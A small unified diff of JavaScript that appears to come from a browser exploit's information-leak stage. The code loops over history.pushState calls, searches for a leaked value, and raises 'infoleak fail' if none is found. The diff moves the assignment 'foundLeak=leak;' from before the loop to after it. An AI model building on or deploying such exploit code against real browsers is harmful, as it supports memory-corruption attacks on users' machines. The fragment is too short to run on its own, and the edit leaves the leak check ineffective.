@@ -144,7 +144,7 @@ props[i++]={value:tgt};
 var foundLeak=undefined;
 var foundIndex=0;
 var maxCount=100;
-  foundLeak=leak;
+  
 while(foundLeak==undefined&&maxCount>0){
 maxCount--;
 history.pushState(y,"");
@@ -157,7 +157,7 @@ foundLeak=leak;break;
 };
 };
 };
-  
+  foundLeak=leak;
 if(!foundLeak){
 throw new Error("infoleak fail");
 };
